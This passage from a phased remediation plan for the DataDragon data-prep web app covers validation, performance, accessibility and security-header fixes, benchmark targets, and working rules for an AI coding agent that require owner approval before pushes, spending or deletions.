- Verify: xfail-flip `test_semantic_id_not_postal` passes. A new parametrised test covers 12 typed columns, with `ID`→Identifier, `Invoice_Date`→Date, `Zip`→Postal Code and `Region`→Text/Category. The analyze golden snapshot is updated with the type changes listed.
- Size M.
- Commit: `fix: semantic type detection uses clamped OR-ed confidences and correct precedence (A-11)`

**T2.8 · Pipeline and Natural Key honesty** — A-09 (D7)
- Change:
  - Test key uniqueness on the **full** data, and report `duplicate_rows` next to any key ("unique after removing N exact duplicate rows").
  - Reject candidates containing nulls unless `allow_null_keys=true`.
  - The Unique-ID export keeps all rows and adds `_is_duplicate`.
  - Unimplemented pipeline transforms are logged and reported as `status: "recorded, not applied"`. The UI copy for "realistic fake names/hashed/bucketed" is changed to what the code actually does.
  - The landing card says "6-stage", or the stepper becomes 5 stages, whichever matches the code.
- Verify: xfail-flip `test_pipeline_key_uniqueness_on_full_data` passes. New test: the PDF text (extract it with `pypdf` if available, otherwise check the `transformation_log` JSON) contains "not applied" for normalization.
- Size M.
- Commit: `fix: pipeline reports only executed transforms; keys tested on full data (A-09)`

**T2.9 · Validation rewrite (correct + vectorised)** — A-10, E-04
- Change: one mask per rule:
  - required: `isna | (str.strip=='')`
  - type: `pd.to_numeric(errors='coerce').isna()` for non-blank values
  - range: cast the bounds to float and flag non-numeric values
  - list: `~isin`, compared as strings
  - pattern: bounded `regex.fullmatch` (T2.4)
  - length: `str.len`
- Report `errors_total` (sum of failures), `invalid_rows` and spreadsheet row = `index+2`. Output limited to the first 10,000 invalid rows, with a note when truncated.
- Verify: the two validation xfail-flips pass. `bench validate` at 500k **< 10 s and < 1.2 GB** (baseline 46.7 s / 3.55 GB).
- Size M.
- Commit: `fix: vectorised validation with correct ranges, fullmatch and error counts (A-10, E-04)`

**T2.10 · Text-tool correctness** — A-13
- Change:
  - Find & Replace operates on the non-null mask only (`s[mask] = ...`), and never `astype(str)` the whole column.
  - Case-insensitive literal mode uses `re.escape(find)` with `repl=lambda m: replace_text`.
  - Column split uses `regex=False`.
  - CONCAT and merge-columns use `.fillna('')` on the parts.
  - Rename rejects collisions with 400.
  - Reorder appends unlisted columns in their original order.
- Verify: xfail-flip `test_blank_not_written_as_nan` passes. New tests cover the `\1` literal replacement, the `" | "` split, the rename collision and reorder keeping all columns.
- Size M.
- Commit: `fix: text tools preserve blanks and treat literals literally (A-13)`

**T2.11 · Large-output guards** — A-15
- Change: `excel_writer` callers check `len(df)`. If it exceeds 1,048,575, write CSV instead (with a `warning` in the final message), or for the splitter enforce `chunk_size ≤ 1,048,575`. The pivot "Source Data" sheet is skipped when there are more than 100k rows (with a warning).
- Verify: a test with a 1,048,576-row frame, marked `slow`, mocked by patching the limit constant down to 100 to keep it fast, falls back to CSV.
- Size S.
- Commit: `fix: guard Excel row/column limits with CSV fallback (A-15)`

**T2.12 · Pivot and natural-key performance** — E-03, E-05
- Change:
  - Pivot styling happens through xlsxwriter before close (from T2.3), with no `load_workbook` and column widths taken from the first 1,000 rows.
  - Natural key: factor L2946-3009 and the pipeline copy into `find_minimal_keys(df, cols, max_size=5, max_candidates=20000, time_budget_s=30)`. It drops columns with `nunique <= 1`, holds non-unique subsets in a `set` of frozensets, screens on a 50k-row sample before confirming on the full data, and returns `truncated: true` when a cap is hit.
- Verify:
  - `bench pivot` at 500k **< 20 s / < 1.5 GB** (baseline 93 s / 5.8 GB).
  - `bench keyworst` 20 columns × 20k completes **< 10 s** or reports `truncated`.
  - Golden key results unchanged.
- Size M.
- Commit: `perf: streaming pivot styling and shared bounded natural-key search (E-03, E-05)`

**T2.13 · Keyboard-operable uploads** — D-01
- Change:
  - Add a `.visually-hidden` utility in `main.css` and replace `display:none` on file inputs (L545-546).
  - In every template with a drop zone (`grep -l 'type="file"' templates/*.html`), make the zone a `<label for="fileInput">` with `tabindex="0"`, plus a keydown handler on Enter or Space that calls `fileInput.click()`.
  - Cached-file rows and toggles become `<button type="button">`.
- Verify:
  - `grep -c 'display:none' static/css/main.css` no longer matches the file-input rule.
  - `grep -L "visually-hidden" $(grep -l 'type="file"' templates/*.html)` returns nothing.
  - Browser check (if a browser tool is available): Tab to the drop zone, press Enter, and the file dialog opens.
- Size M.
- Commit: `a11y: keyboard-operable file upload on all tools (D-01)`

**T2.14 · Honest distribution chart** — C-01
- Change: replace the quantile bar chart (`column_analyzer.html:2246-2311`) with a horizontal box/range strip. Draw it in a Chart.js floating bar for Q1–Q3 plus scatter points for min, median and max on a linear x-axis from min to max, or as inline SVG.
- Verify: a screenshot of Column Analyzer on `golden.xlsx` (Amount column, which has negatives) shows the box spanning Q1–Q3 with the median tick inside. Save the screenshot to `docs/screens/c01_after.png`.
- Size S.
- Commit: `viz: replace quantile bar chart with box/range strip (C-01)`

**Phase 2 gate:**
- Independent review.
- `pip-audit` clean; `$PYTEST -q` passes.
- `$PYTEST -rx | grep XFAIL` is empty.
- Benchmarks updated in `docs/BASELINES.md`.

---

### Phase 3 — P2

**T3.1 · `static/js/common.js` — shared front-end core** — F-02, D-04, B-01
- Change:
  - Extract the following into `common.js`:
    - `escapeHtml`
    - an upload widget initialiser that shows the file name (D-07)
    - a `startJob(url, formData, {onProgress, onDone, onError})` SSE helper: check `response.ok` before parsing, 5 reconnect attempts, then a visible error; no `alert()`
    - a cached-files list that sends `cache_id` to the server instead of re-uploading the bytes. This needs a server change: every tool route accepts `cache_id` via a shared `resolve_input(request)` helper that enforces the owner.
    - a modal helper
  - Add `POST /jobs/<id>/cancel`, which sets a cancel flag that long loops check.
  - Migrate templates in batches of 4 (one commit each).
- Verify:
  - After each batch, run `$PYTEST -q` and `grep -c "function escapeHtml" templates/*.html` (decreasing to 0).
  - Browser smoke on one tool per batch.
  - The final batch removes all duplicates.
- Size L (4–5 commits).
- Commit: `refactor(ui): shared upload/SSE/cache helpers for <tools> (F-02, D-04)`

**T3.2 · Server job framework, logging, error hygiene** — F-01, H-07, G-11
- Change:
  - `run_job(owner, fn, *args)` wraps the progress, final-message, error-cleanup and executor submission code.
  - `@upload_route(allowed=...)` handles save and validation.
  - `df_preview(df, n)` uses `to_dict('records')` plus `make_json_serializable`. Fix A-18 here: non-finite floats → None, and check `ndarray` before `item`.
  - Replace `print` with `logging` (JSON-ish format including the job id), and never log cell values.
  - Clients get a generic `"Processing failed (ref <job_id>)"`; details go to the log only.
- Verify:
  - `grep -c "print(" datadragon.py` returns 0.
  - `grep -c "'error': str(e)" datadragon.py` returns 0.
  - `wc -l datadragon.py` is reduced by ≥ 800 lines.
  - `$PYTEST -q` passes, with golden snapshots unchanged.
- Size L.
- Commit: `refactor: shared job runner, upload decorator and structured logging (F-01, H-07, G-11, A-18)`

**T3.3 · Accessibility pass** — D-02, D-03
- Change:
  - Global `:focus-visible` ring (2px `--accent-purple`, 2px offset).
  - `--text-muted` set to `rgba(255,255,255,.6)`.
  - Primary button gradient set to `#7c3aed → #2563eb`.
  - `role="status" aria-live="polite"` on progress text and `role="alert"` on errors.
  - `role="progressbar"` with `aria-valuenow` on bars.
  - Wrap the orb animations and backdrop blur in `@media (prefers-reduced-motion: no-preference)`.
- Verify:
  - `scripts/contrast.py` computes the WCAG ratios for the token pairs. Assert ≥ 4.5 for body and muted text, and ≥ 4.5 for button text.
  - If Node and Chrome are available: `npx --yes @axe-core/cli http://127.0.0.1:5002/ http://127.0.0.1:5002/column-analyzer --exit` returns 0 serious/critical. Record the before/after counts.
- Size M.
- Commit: `a11y: focus rings, live regions, contrast tokens, reduced motion (D-02, D-03)`

**T3.4 · Chart system** — C-02, C-03, C-04
- Change:
  - Add `static/js/charts.js`: Okabe-Ito palette, shared defaults, visible legends where colour encodes a class, sorted horizontal bars with top-N (default 25) for per-column charts, full names in tooltips, and a "Download PNG" button per chart.
  - Canvas ids by column index.
  - Column Analyzer PDF export embeds the chart images (`toBase64Image` → jsPDF `addImage`).
  - Use a single html2canvas version, or remove it if unused.
  - Add SRI `integrity` and `crossorigin` to all CDN tags (G-10).
- Verify:
  - Screenshots `docs/screens/c02_*.png`.
  - `grep -c "integrity=" templates/*.html` covers every `cdn` script tag.
  - The PDF exported from Column Analyzer contains images (`pdfimages -list` if poppler is installed, otherwise check the file size grows by more than 20 KB).
- Size M.
- Commit: `viz: shared colour-blind-safe chart theme, legends, PNG/PDF export (C-02, C-03, C-04)`

**T3.5 · Logo asset** — E-07
- Change: create `static/images/datadragon-logo-128.png`, `-256.png` and `.webp` from the source PNG (`sips -Z 256 …` on macOS, or Pillow). Use `srcset` everywhere the logo appears. Keep the original out of the served path: move it to `design/source/`, and ask the owner whether to keep it in git.
- Verify: `ls -l static/images/datadragon-logo-256.webp` shows < 30 KB, and `grep -rn "datadragon-logo.png" templates` returns nothing.
- Size S.
- Commit: `perf: serve right-sized logo assets (E-07)`

**T3.6 · Excel Splitter on the shared design system** — D-05 (D5)
- Change: rebuild `templates/index.html` to extend `base.html` and use `common.js`. Remove the Classic/Future theme playground (per D5). Keep the chunk size and base filename inputs and the 40,000 default.
- Verify: `grep -c "extends \"base.html\"\|extends 'base.html'" templates/index.html` returns 1, the split golden test passes, and the screenshot is saved.
- Size M.
- Commit: `ui: rebuild Excel Splitter on base layout (D-05)`

**T3.7 · Pipeline UX** — D-06
- Change: render a real `head(20)` preview from `/state`, which now includes `preview` via `df_preview`. Put the session id in the URL (`?s=<id>`) and resume on load if the owner matches.
- Verify: a test where `/pipeline/<id>/state` contains `preview` with 20 rows, plus a browser refresh check.
- Size M.
- Commit: `ui: pipeline preview and resumable sessions (D-06)`

**T3.8 · Rate limiting & headers** — G-09, G-10
- Change:
  - Key the bucket by `(ip, endpoint)`.
  - Apply `ProxyFix(x_for=1)` only when `DATADRAGON_TRUST_PROXY=1`.
  - Evict empty buckets.
  - Add an `after_request` that sets `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: same-origin`, and a CSP allowing self plus the specific CDNs with `'unsafe-inline'` for now (inline scripts remain; note this as tech debt).
- Verify: a test where 10 hits on `/find-replace` don't 429 `/analyze`, and a test that the headers are present on `/`.
- Size S.
- Commit: `security: per-route rate limits, proxy awareness, security headers (G-09, G-10)`

**T3.9 · Reader edge cases** — A-17, A-20, E-06
- Change:
  - Preview row count via `csv.reader` for CSV and openpyxl `read_only` `max_row` for xlsx.
  - Row Filter evaluates AND before OR and returns 400 for a non-numeric value with a numeric operator.
  - `ROUND` uses half-up (`Decimal.quantize(ROUND_HALF_UP)`) and `RIGHT(x,0)` returns `''`.
  - Column Comparison reads xlsx headers via openpyxl row 1 and CSV headers via the encoding fallback.
- Verify: new unit tests for each item.
- Size M.
- Commit: `fix: accurate previews, filter precedence, Excel-compatible ROUND (A-17, A-20)`

**T3.10 · Docs** — F-04, J-01
- Change: rewrite `README.md` to cover:
  - what DataDragon is and its tool list
  - quick start (`python3 -m venv .venv`, install, `python datadragon.py` → http://127.0.0.1:5002)
  - environment variables (`DATADRAGON_DATA_DIR`, `DATADRAGON_SECRET_KEY`, `PORT`, `HOST`, `DATADRAGON_OUTPUT_TTL_MIN`, `DATADRAGON_MAX_JOBS`, `DATADRAGON_TRUST_PROXY`, `DATADRAGON_HTTPS`)
  - the deployment caveat (single worker)
  - running tests
  - the data-handling statement matching `security_info.html`

  Mark `PROJECT_SUMMARY.md` for deletion (D6).
- Verify: every command in the README runs as written in a fresh shell (copy-paste test), and `grep -n "app.py" README.md` returns nothing.
- Size S.
- Commit: `docs: accurate README for DataDragon v4 (F-04)`

**T3.11 · Transformation log in outputs** — B-01
- Change: each tool's xlsx output gets a final sheet `_DataDragon_Log` (tool, version/commit, UTC timestamp, parameters with secrets removed, rows in/out, warnings). CSV outputs get a sidecar `<name>.log.json` inside the zip, or a JSON download link.
- Verify: a golden test that the log sheet exists and has the expected keys for 3 tools.
- Size M.
- Commit: `feat: embed transformation log in every output (B-01)`

---

### Phase 4 — P3

**T4.1 · Dead code and stale files** — F-03 (D6: confirm first)
- Change: fix all pyflakes warnings. After owner confirmation, delete `Data Split.py`, `create_test_file.py`, `templates/splash.html`, `static/images/SQUARE__11-21-2025-7-55-45.mp4`, `static/images/datadragon-logo_old.svg`, `PROJECT_SUMMARY.md`, and the outdated `static/images/README.md`.
- Verify: `.venv/bin/python -m pyflakes datadragon.py datadragon_formula.py` produces no output. CI pyflakes becomes fully gating, and `$PYTEST -q` passes.
- Size S.
- Commit: `chore: remove dead code and orphaned assets (F-03)`

**T4.2 · Hub and naming polish** — D-07
- Change:
  - A client-side filter box on `landing.html` (filters cards by name and description, keyboard focusable, `/` shortcut).
  - Route aliases `/data-anonymizer` → same view and `/natural-key-finder` → same view, keeping the old routes.
  - Preview tables get `overscroll-behavior: auto` and a max-height of 360px.
- Verify: smoke tests for the alias routes return 200, plus a browser check.
- Size S.
- Commit: `ui: tool search and consistent route names (D-07)`

**T4.3 · Responsive gaps** — D-08
- Change: shared responsive rules in `main.css` for form grids and tables (`overflow-x:auto` wrappers) and verify the 8 listed templates at 375 px.
- Verify: 375×812 screenshots of each of the 8 pages with no horizontal page scroll. Check with `document.documentElement.scrollWidth <= innerWidth` via the browser tool if available.
- Size S.
- Commit: `ui: mobile layout for remaining tools (D-08)`

---

### Phase 5 — Optional media (Higgsfield) — **requires owner approval (D10); spends credits**

The only asset that clears the bar is a small, consistent set of **empty-state illustrations**. Charts and data visuals stay in code.

A product walkthrough must be a **real screen recording** (it has to be factually accurate), so it is not generated. Do not generate a hero video either: it conflicts with D-03 (reduced motion) and E-07 (weight).

**M-1 · Empty-state illustration set (4 images)** — supports D-07 and J-01
- **Placement:**
  1. Upload drop zone before a file is chosen (all tools, via the T3.1 widget).
  2. "No duplicates found" result.
  3. "No issues found" in Validation and the Pipeline gap stage.
  4. The landing page "Start here" card, next to "Generate Test File".
- **Prompt (base):**
  > Minimal flat vector-style illustration of a small friendly geometric dragon made of simple faceted shapes, [SCENE], centered composition with generous negative space, dark background #0a0a0f, palette limited to violet #a855f7, blue #3b82f6 and cyan #06b6d4 with soft white highlights, subtle glow, no text, no letters, no numbers, no charts, no UI, clean edges, 1:1
- **[SCENE] variants:**
  1. "curled around an empty glowing document tray, waiting"
  2. "holding a magnifying glass over two identical cards, looking satisfied"
  3. "giving a thumbs-up beside a checklist with all items ticked (ticks only, no text)"
  4. "pointing toward an upward arrow"
- **Model:** let Claude choose. Call `models_explore(action:'recommend')` and prefer an image model that holds flat illustration style and exact palette control and supports a reference image. Generate at 1024×1024.
- **Consistency:** generate #1 first. After owner approval, register it with `manage_reference_elements` as the character and style reference, and pass it as the reference for #2–#4.
- **Cost discipline:**
  1. `balance`
  2. `generate_image` for #1 only
  3. owner review
  4. a quote for the remaining 3
  5. `generate_image_batch` → `jobs_wait` → `show_generation_by_ids`
- **Delivery:**
  - Download to `static/images/illustrations/empty-{upload,duplicates,valid,start}.webp`.
  - Remove the background (`remove_background`) only if the dark background clashes with the glass cards.
  - Resize to 320×320 and 640×640 (`srcset`) as WebP at quality 80, under 35 KB each.
  - Mark-up: `<img loading="lazy" decoding="async" alt="" aria-hidden="true" width="160" height="160">` (decorative).
- **Verify:** `ls -l static/images/illustrations` shows sizes under 35 KB and a screenshot of each placement.
- Commit: `assets: empty-state illustrations (M-1)`

**M-2 (optional, only if D1 = hosted) · Social preview image (1200×630)**
- Same style reference and the same palette. Scene: "dragon beside a stack of neatly aligned spreadsheet-like tiles with no text".
- Add `<meta property="og:image">` to `base.html`.
- WebP or PNG under 120 KB at `static/images/og.png`.

---

## 7. Baselines & success metrics

Capture "before" values in T0.6 (pandas 2.x after the pin) and "after" values at each phase gate, in `docs/BASELINES.md`. The audit values (pandas 3.0.6) are shown for reference.

| Metric | How measured | Audit value | Target |
|---|---|---|---|
| Known-bug xfails | `$PYTEST -rx \| grep -c XFAIL` | n/a (≈30 after T0.5) | 0 |
| Tests passing | `$PYTEST -q` | 0 tests | 100% green, ≥ 120 tests |
| Line coverage of `datadragon.py` | `$PYTEST --cov=datadragon --cov-report=term` | 0% | ≥ 70% (≥ 85% on tool functions) |
| pip-audit vulns | `pip-audit -r requirements.txt` | 14 | 0 |
| pyflakes warnings | `pyflakes datadragon.py \| wc -l` | 34 (1 undefined name) | 0 |
| `eval`/`exec` in code | `grep -cE "\beval\(\|\bexec\(" *.py` | 1 | 0 |
| Compare, 100k rows, 1 key | `scripts/bench.py … compare1key` | 391 s | < 15 s |
| Duplicates, 100k high-cardinality | `… dup_highcard` | 49 s | < 5 s |
| Pivot, 500k | `… pivot` | 93 s / 5.8 GB | < 20 s / < 1.5 GB |
| Validate, 500k | `… validate` | 46.7 s / 3.55 GB | < 10 s / < 1.2 GB |
| Key search worst case (20 cols × 20k) | `… keyworst` | 11.8 s, unbounded at 30 cols | < 10 s or `truncated` reported |
| xlsx write, 100k | `… write_xlsx` | 6.9 s | ≤ 4 s (xlsxwriter) |
| Concurrent same-second jobs | `test_concurrent_split_isolated` | fails | passes |
| gunicorn gthread 8× concurrent progress | `scripts/smoke_progress.py` | 6/8 failed (`-w 4`) | 8/8 |
| Logo bytes | `ls -l` | 1,088,798 B | < 30 KB |
| Landing page transfer (cold) | browser network panel or `curl -so /dev/null -w '%{size_download}'` summed over assets | measure in T0.6 | −1 MB |
| WCAG contrast (muted, buttons) | `scripts/contrast.py` | 3.8 : 1 / 3.7 : 1 | ≥ 4.5 : 1 |
| axe serious+critical (landing, analyzer, pipeline) | `npx @axe-core/cli …` | measure in T3.3 | 0 |
| Keyboard-uploadable tools | manual / grep | 0 of 18 | 18 of 18 |
| `print(` calls | `grep -c "print(" datadragon.py` | 247 | 0 |
| `datadragon.py` lines | `wc -l` | 7,180 | ≤ 6,300 after T3.2 |

---

## 8. Working rules for the executing agent

1. **Start in plan mode.** Read `REVIEW_PLAN.md`, `CLAUDE.md`, `PROGRESS.md` and the task's "Read" files before editing. The repo path contains spaces: always quote it.
2. **Phase 0 first.** No behaviour change until the golden snapshots and strict-xfail tests exist. The only exceptions are the T0.1 pin and the `xlrd` addition, which are recorded.
3. **One task per commit.** Keep diffs small and revertible. Run the task's **Verification** and then the full `$PYTEST -q` before committing, and use the commit message given. Add the trailer `Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>`.
4. **Never weaken, skip or delete a test to make it pass.**
   - Golden snapshots may only be regenerated (`--update-golden`) in a commit whose body lists each changed snapshot and the finding that justifies it.
   - Remove an xfail marker only when the fix lands in that same commit.
5. **Keep `PROGRESS.md` current** after every task: status, the verification command and its result, metrics captured, and open issues or surprises. This is the resume point after a context reset.
6. **Use subagents** for broad searches (e.g. "every `to_excel` call", "every `innerHTML` interpolation"). At each phase gate, have a subagent that has not seen the work review `git diff <phase-start>..HEAD` against this plan and its findings. Fix what it finds before reporting.
7. **Stop and ask the owner before:**
   - any `git push`, new remote or PR (D9: `origin` is someone else's repo)
   - deleting files or features (D5, D6)
   - major-version dependency upgrades (pandas 3, Flask 4)
   - anything that spends money, including Higgsfield (D10)
   - deploying anywhere
   - changing data-handling claims beyond making them truthful
   - a task that turns out wrong or more than ~2× its size estimate
8. **Never** put real user data in fixtures, logs, test names or commit messages. Never log cell values.
9. **Never run the app against the repo directory with real files.** Use `DATADRAGON_DATA_DIR=$(mktemp -d)` for manual runs.

### Draft `CLAUDE.md` (commit in T0.7)

```markdown
# DataDragon — agent notes

## Setup & commands
- Python 3.12–3.14. `python3 -m venv .venv && .venv/bin/pip install -r requirements-dev.txt`
- Run: `DATADRAGON_DATA_DIR=$(mktemp -d) .venv/bin/python datadragon.py` → http://127.0.0.1:5002 (port 5002, not 5000: macOS AirPlay owns 5000)
- Tests: `.venv/bin/python -m pytest -q` (slow perf tests: `-m slow`)
- Regenerate golden snapshots ONLY with justification: `.venv/bin/python -m pytest tests/golden --update-golden`
- Lint: `.venv/bin/python -m pyflakes datadragon.py datadragon_formula.py`
- Audit deps: `.venv/bin/pip-audit -r requirements.txt`
- Benchmarks: `.venv/bin/python scripts/gen_synthetic.py 100000 csv /tmp/dd && .venv/bin/python scripts/bench.py /tmp/dd/syn_100000.csv <case>`

## Gotchas
- Repo path contains spaces — quote it.
- `import datadragon` creates `uploads/` and `output/` under `DATADRAGON_DATA_DIR` (default: repo dir) and starts a daemon cleanup thread.
- `.gitignore` ignores `*.xlsx`/`*.csv`; fixtures are whitelisted under `tests/fixtures/`.
- pandas is pinned `<3` — several code paths break on pandas 3.
- All job state is in-process: run ONE gunicorn worker (`-k gthread -w 1 --threads 8`). Multi-worker is unsupported.
- Read files only via `read_data_file(path, mode='lossless'|'infer')`; write xlsx only via `excel_writer()` (formula-injection safe).
- Never use `eval`/`exec`; formulas go through `datadragon_formula.py`.
- Every job/cache/download is owner-scoped via the signed session cookie; new endpoints must check ownership.
- Never print or log cell values (PII).
- Each tool page is a Jinja template in `templates/` extending `base.html`; shared JS in `static/js/common.js`, charts in `static/js/charts.js`.
- Do not push: `origin` is TamReversed/DataDragonV2.1; ask the owner.
```

---

## 9. Out of scope / deliberately not doing

- **User accounts, SSO, roles.** Per-browser ownership closes the proven IDORs. Real identity only matters if D1 = hosted multi-tenant with named users, and that is a separate project.
- **Redis/Celery/RQ job queue and multi-worker scaling.** A single gthread worker with a bounded pool fits the analyst-tool use case. Externalising state is justified only once there are real concurrent users.
- **pandas 3 / Polars / DuckDB engine migration.** It would be valuable for 5M-row files, but must come after the golden suite exists. Track it as a follow-up.
- **SPA/React rewrite or a new design system.** The token system in `main.css` is sound. The problems are duplication and accessibility, which T3.1/T3.3 address directly.
- **Notebook, BI or dashboard features to match Hex, Observable, Mode or Tableau.** That is a different product category. DataDragon wins by being the trustworthy ERP-load prep tool (J-01).
- **Full recipe replay and undo across tools.** T3.11 records the log, which is the prerequisite. Replay is a follow-up feature.
- **Keyed-HMAC (cross-file stable) pseudonyms.** A useful anonymiser upgrade, but not justified by a correctness finding. The P0 leak is fixed in T1.10.
- **PDF→Word tool.** It was not audited beyond routing and is not core to the data-prep mission. Keep it as-is.
- **Generated hero or walkthrough video.** A walkthrough must be a real screen capture. A hero loop conflicts with reduced motion and page weight.
- **Implementing the pipeline's stubbed transforms (normalization, gap handling).** For now they are labelled honestly (D7). Implement them after T1.11, as a separate scoped task.
